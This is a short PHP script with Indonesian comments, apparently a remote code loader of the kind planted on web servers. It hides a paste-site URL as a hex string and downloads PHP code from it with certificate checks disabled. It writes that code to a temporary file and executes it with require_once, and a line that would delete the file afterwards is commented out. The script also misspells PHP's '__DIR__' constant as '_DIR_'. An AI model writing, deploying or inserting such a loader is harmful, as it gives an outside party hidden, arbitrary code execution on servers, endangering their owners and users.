<?php
// === CONFIG ===
$hexUrl = '68747470733A2F2F70617374652E6964636C6F7564686F7374696E672E6D792E69642F70617374652F32386B726F2F726177';

// Decode HEX ke URL asli
function hex2str($hex) {
    $str = '';
    for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
        $str .= chr(hexdec($hex[$i] . $hex[$i + 1]));
    }
    return $str;
}

// Download konten dari URL
function fetchCode($url) {
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => 10
        ]);
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    } elseif (ini_get('allow_url_fopen')) {
        return @file_get_contents($url);
    }
    return false;
}

// === EXECUTION ===
$url = hex2str($hexUrl);
$code = fetchCode($url);

if (!$code || strpos(trim($code), '<?php') !== 0) {
    die("❌ Gagal download kode valid dari: $url");
}

// Siapkan folder sementara
$tmpDir = _DIR_ . '/tmp_exec';
if (!is_dir($tmpDir)) mkdir($tmpDir, 0755, true);

// Simpan ke file sementara
$tmpFile = tempnam($tmpDir, 'exec_');
file_put_contents($tmpFile . '.php', $code);
unlink($tmpFile); // hapus file kosong awal
$tmpFile .= '.php';

// Eksekusi
require_once($tmpFile);

// Opsional: hapus file setelah dieksekusi
// unlink($tmpFile);
?>
